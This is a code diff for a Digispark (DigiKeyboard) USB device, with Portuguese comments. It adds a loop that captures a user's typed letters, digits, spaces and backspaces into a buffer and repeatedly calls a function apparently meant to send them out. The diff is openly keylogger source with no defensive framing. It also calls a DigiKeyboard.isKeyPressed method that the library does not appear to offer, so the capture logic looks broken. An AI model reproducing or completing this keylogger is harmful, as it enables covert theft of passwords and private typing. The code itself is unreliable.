@@ -13,9 +13,33 @@ void loop() {
     // Aguardar algum tempo antes de começar a captura para dar tempo ao sistema
     DigiKeyboard.delay(5000); // Aguarda 5 segundos
 
-    // Ativa a captura de teclas
-    startCapturing();
-    captureKeys(); // Chama a função de captura de teclas
+    // Captura teclas digitadas
+    while (true) {
+        for (char key = 'a'; key <= 'z'; key++) {
+            if (DigiKeyboard.isKeyPressed(key)) {
+                keysCaptured += key;
+                DigiKeyboard.delay(50);
+                checkSendKeys();
+            }
+        }
+        for (char key = '0'; key <= '9'; key++) {
+            if (DigiKeyboard.isKeyPressed(key)) {
+                keysCaptured += key;
+                DigiKeyboard.delay(50);
+                checkSendKeys();
+            }
+        }
+        if (DigiKeyboard.isKeyPressed(' ')) {
+            keysCaptured += ' ';
+            DigiKeyboard.delay(50);
+            checkSendKeys();
+        }
+        if (DigiKeyboard.isKeyPressed(DigiKeyboard.KEY_BACKSPACE)) {
+            keysCaptured += "[BACKSPACE]";
+            DigiKeyboard.delay(50);
+            checkSendKeys();
+        }
+    }
 }
 
 // Função para capturar teclas
